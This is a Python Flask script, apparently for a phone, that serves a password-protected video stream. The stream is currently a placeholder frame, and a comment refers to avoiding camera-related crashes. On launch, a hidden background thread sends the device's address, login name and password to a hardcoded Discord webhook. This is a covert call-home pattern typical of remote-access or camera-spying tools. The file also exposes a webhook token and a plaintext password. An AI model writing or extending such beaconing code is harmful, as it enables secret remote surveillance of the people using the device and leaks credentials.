import json
import os
import re
import socket
import subprocess
import threading
import time
import urllib.request
from flask import Flask, Response, request
import cv2
import numpy as np

# ===== 1. رابط الـ Webhook الخاص بك في ديسكورد =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"

# ===== 2. بيانات الأمان =====
USERNAME = "IMNOTSNEAKER"
PASSWORD = "3mko@3omar"
PORT = 8080

app = Flask(__name__)


def check_auth(username, password):
    return username == USERNAME and password == PASSWORD


def authenticate():
    return Response(
        'Login Required',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'},
    )


def get_local_ip():
    """معرفة الـ IP المحلي للهاتف"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def generate_frames():
    """إنشاء بث فيديو تجريبي لتفادي إغلاق التطبيق بسبب الكاميرا"""
    while True:
        try:
            # إنشاء إطار رمادي بخلفية نصية يوضح حالة البث
            img = np.zeros((1280, 720, 3), np.uint8)
            cv2.putText(
                img,
                "Mobile Server Active",
                (100, 640),
                cv2.FONT_HERSHEY_SIMPLEX,
                1.5,
                (0, 255, 0),
                2,
            )
            _, buffer = cv2.imencode('.jpg', img)
            yield (
                b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n'
                + buffer.tobytes()
                + b'\r\n'
            )
            time.sleep(0.1)
        except Exception:
            break


@app.route('/')
def index():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

    return '''
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Mobile Server Share</title>
        <style>
            body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
            img { height: 100%; object-fit: contain; }
        </style>
    </head>
    <body>
        <img src="/video_feed" />
    </body>
    </html>
    '''


@app.route('/video_feed')
def video_feed():
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()
    return Response(
        generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame'
    )


def send_to_discord(server_url):
    """إرسال رابط السيرفر المحلي وبيانات الدخول للديسكورد"""
    if not WEBHOOK_URL or "discord" not in WEBHOOK_URL:
        return

    payload = {
        "embeds": [
            {
                "title": "📱 تم تشغيل السيرفر بنجاح!",
                "color": 5814783,
                "fields": [
                    {
                        "name": "🔗 رابط الاتصال المحلي",
                        "value": f"[اضغط هنا]({server_url})\n`{server_url}`",
                    },
                    {
                        "name": "👤 اسم المستخدم",
                        "value": f"`{USERNAME}`",
                        "inline": True,
                    },
                    {
                        "name": "🔑 كلمة السر",
                        "value": f"`{PASSWORD}`",
                        "inline": True,
                    },
                ],
                "footer": {"text": "Mobile App • Running in background"},
            }
        ]
    }

    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
        )
        urllib.request.urlopen(req)
        print("Sent successfully to Discord")
    except Exception as e:
        print(f"Discord send error: {e}")


def initialize_app():
    """تشغيل إرسال الديسكورد فور الفتح"""
    time.sleep(1)
    ip = get_local_ip()
    local_url = f"http://{ip}:{PORT}"
    send_to_discord(local_url)


if __name__ == "__main__":
    # تشغيل إرسال الرسالة للديسكورد في الخلفية فور بدء التطبيق
    threading.Thread(target=initialize_app, daemon=True).start()

    # تشغيل سيرفر Flask باستخدام الخادم المدمج بدلاً من gevent لتجنب الأعطال
    app.run(host='0.0.0.0', port=PORT, threaded=True)
